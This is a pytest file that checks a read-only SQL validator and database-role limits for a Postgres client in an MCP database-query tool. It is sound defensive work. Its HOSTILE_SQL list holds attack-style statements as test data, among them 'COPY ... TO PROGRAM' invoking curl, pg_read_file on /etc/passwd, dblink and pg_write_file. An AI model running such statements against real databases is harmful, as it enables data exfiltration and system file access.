"""Tests for PostgresClient - read-only enforcement (unit) + integration (INTEGRATION=1)."""

from __future__ import annotations

import os

import pytest
import pytest_asyncio

from mcp_toolkit.servers.database_query.postgres_client import PostgresClient, _validate_read_only


# Shared with test_sql_safety.py, which runs each entry through every validation path.
HOSTILE_SQL = [
    "SELECT * INTO stolen FROM users",
    "COPY users TO PROGRAM 'curl https://example.invalid'",
    "SET ROLE postgres",
    "VACUUM FULL",
    "SELECT pg_terminate_backend(1)",
    "SELECT pg_read_file('/etc/passwd')",
    "SELECT * FROM dblink('host=x', 'SELECT 1') AS t(a int)",
    "SELECT set_config('search_path', 'evil', false)",
    "SELECT query_to_xml('DELETE FROM users', true, true, '')",
    "SELECT * FROM users FOR UPDATE",
    "EXPLAIN ANALYZE DELETE FROM users",
    "EXPLAIN (ANALYZE) SELECT 1",
    "EXPLAIN DELETE FROM users",
    "",
    "SELECT pg_write_file('/tmp/x', 'data')",
    "SELECT lo_get(16384)",
    "SELECT lo_from_bytea(0, 'x')",
    "SELECT pg_catalog.pg_read_file('/etc/passwd')",
    "SELECT * FROM pg_ls_waldir()",
    "WITH d AS (DELETE FROM users RETURNING *) SELECT * FROM d",
]

ALLOWED_SQL = [
    "SELECT 1 UNION SELECT 2",
    "EXPLAIN (FORMAT JSON) SELECT * FROM orders",
    "SELECT count(*), max(id), now() FROM users",
    "SELECT id FROM docs ORDER BY embedding <=> '[1,2,3]'::vector LIMIT 5",
]


# ---------------------------------------------------------------------------
# Unit tests: sqlglot read-only validator
# ---------------------------------------------------------------------------


class TestValidateReadOnly:
    def test_allows_select(self):
        _validate_read_only("SELECT id, name FROM users WHERE active = true")

    def test_allows_cte_select(self):
        _validate_read_only("WITH t AS (SELECT 1 AS n) SELECT n FROM t")

    def test_allows_explain(self):
        _validate_read_only("EXPLAIN SELECT * FROM orders")

    def test_blocks_insert(self):
        with pytest.raises(ValueError, match="Insert"):
            _validate_read_only("INSERT INTO users (name) VALUES ('x')")

    def test_blocks_update(self):
        with pytest.raises(ValueError, match="Update"):
            _validate_read_only("UPDATE users SET name = 'y' WHERE id = 1")

    def test_blocks_delete(self):
        with pytest.raises(ValueError, match="Delete"):
            _validate_read_only("DELETE FROM users WHERE id = 1")

    def test_blocks_drop(self):
        with pytest.raises(ValueError, match="Drop"):
            _validate_read_only("DROP TABLE users")

    def test_blocks_create(self):
        with pytest.raises(ValueError, match="Create"):
            _validate_read_only("CREATE TABLE foo (id INT)")

    def test_blocks_alter(self):
        with pytest.raises(ValueError, match="Alter"):
            _validate_read_only("ALTER TABLE users ADD COLUMN age INT")

    def test_blocks_truncate(self):
        with pytest.raises(ValueError, match="Truncate"):
            _validate_read_only("TRUNCATE TABLE logs")

    def test_blocks_multi_statement_with_write(self):
        with pytest.raises(ValueError):
            _validate_read_only("SELECT 1; DELETE FROM users WHERE id = 1")

    @pytest.mark.parametrize("sql", HOSTILE_SQL)
    def test_blocks_non_read_statements(self, sql):
        with pytest.raises(ValueError, match="Read-only mode"):
            _validate_read_only(sql)

    @pytest.mark.parametrize("sql", ALLOWED_SQL)
    def test_allows_plain_reads(self, sql):
        _validate_read_only(sql)


# ---------------------------------------------------------------------------
# Unit tests: PostgresClient.execute() blocked in read-only mode
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_execute_blocked_in_read_only_mode():
    client = PostgresClient(pool=None, read_only=True)
    with pytest.raises(PermissionError, match="[Rr]ead.only"):
        await client.execute("DELETE FROM users")


# ---------------------------------------------------------------------------
# Integration tests (skipped unless INTEGRATION=1)
# ---------------------------------------------------------------------------

INTEGRATION = os.environ.get("INTEGRATION") == "1"
DATABASE_URL = os.environ.get("DATABASE_URL", "")
ADMIN_DATABASE_URL = os.environ.get("ADMIN_DATABASE_URL", "")

# DATABASE_URL connects as mcp_reader, ADMIN_DATABASE_URL as the superuser that ran
# integration_setup.sql. Both are needed; CI fails the job if any test here skips.
pytestmark_integration = pytest.mark.skipif(
    not INTEGRATION or not DATABASE_URL or not ADMIN_DATABASE_URL,
    reason="Set INTEGRATION=1, DATABASE_URL (mcp_reader) and ADMIN_DATABASE_URL (superuser)",
)


@pytest_asyncio.fixture
async def reader_pool():
    import asyncpg

    pool = await asyncpg.create_pool(dsn=DATABASE_URL, min_size=1, max_size=2)
    yield pool
    await pool.close()


@pytest_asyncio.fixture
async def admin_pool():
    import asyncpg

    pool = await asyncpg.create_pool(dsn=ADMIN_DATABASE_URL, min_size=1, max_size=2)
    yield pool
    await pool.close()


@pytestmark_integration
async def test_integration_fetch_select(reader_pool):
    rows = await PostgresClient(pool=reader_pool).fetch("SELECT id, name FROM items ORDER BY id")
    assert [r["name"] for r in rows] == ["alpha", "beta", "gamma"]


@pytestmark_integration
async def test_integration_validator_blocks_write_before_the_database(reader_pool):
    client = PostgresClient(pool=reader_pool, read_only=True)
    with pytest.raises(ValueError, match="Read-only mode"):
        await client.fetch("INSERT INTO items VALUES (9, 'x')")


@pytestmark_integration
async def test_integration_role_refuses_write_without_validator(reader_pool):
    """Second layer on its own: read_only=False skips the validator, the role still refuses."""
    import asyncpg

    client = PostgresClient(pool=reader_pool, read_only=False)
    with pytest.raises((asyncpg.InsufficientPrivilegeError, asyncpg.ReadOnlySQLTransactionError)):
        await client.execute("INSERT INTO items VALUES (9, 'x')")
    with pytest.raises((asyncpg.InsufficientPrivilegeError, asyncpg.ReadOnlySQLTransactionError)):
        await client.execute("DELETE FROM items")


@pytestmark_integration
async def test_integration_default_transaction_read_only_blocks_granted_insert(reader_pool):
    """The role may INSERT into write_probe, so only default_transaction_read_only refuses."""
    import asyncpg

    client = PostgresClient(pool=reader_pool, read_only=False)
    with pytest.raises(asyncpg.ReadOnlySQLTransactionError):
        await client.execute("INSERT INTO write_probe VALUES (1)")


@pytestmark_integration
async def test_integration_forbidden_table_needs_a_grant(reader_pool):
    import asyncpg

    sql = "SELECT secret FROM forbidden_secrets"
    _validate_read_only(sql)  # the validator allows it; the database must not
    with pytest.raises(asyncpg.InsufficientPrivilegeError):
        await PostgresClient(pool=reader_pool).fetch(sql)


@pytestmark_integration
async def test_integration_statement_timeout_cancels_expensive_select(reader_pool):
    import asyncpg

    sql = "SELECT count(*) FROM generate_series(1, 4000) a, generate_series(1, 4000) b, generate_series(1, 4000) c"
    _validate_read_only(sql)
    with pytest.raises(asyncpg.QueryCanceledError):
        await PostgresClient(pool=reader_pool).fetch(sql)


@pytestmark_integration
async def test_integration_revoked_security_definer_function_is_rejected(reader_pool):
    """leak() is not on the denylist, so the validator allows it; REVOKE ... FROM PUBLIC stops it."""
    import asyncpg

    _validate_read_only("SELECT leak()")
    with pytest.raises(asyncpg.InsufficientPrivilegeError):
        await PostgresClient(pool=reader_pool).fetch("SELECT leak()")


@pytestmark_integration
async def test_integration_not_blocked_grant_execute_on_security_definer(reader_pool, admin_pool):
    """not blocked: do not grant EXECUTE on SECURITY DEFINER functions."""
    await admin_pool.execute("GRANT EXECUTE ON FUNCTION leak() TO mcp_reader")
    try:
        rows = await PostgresClient(pool=reader_pool).fetch("SELECT leak() AS leaked")
    finally:
        await admin_pool.execute("REVOKE EXECUTE ON FUNCTION leak() FROM mcp_reader")
    print("not blocked: do not grant EXECUTE on SECURITY DEFINER functions")
    assert rows == [{"leaked": "synthetic-secret-1"}]


@pytestmark_integration
async def test_integration_not_blocked_no_row_predicate(reader_pool):
    """not blocked: no row predicate."""
    rows = await PostgresClient(pool=reader_pool).fetch("SELECT * FROM tenant_rows")
    print("not blocked: no row predicate")
    assert {r["tenant"] for r in rows} == {"tenant_a", "tenant_b"}
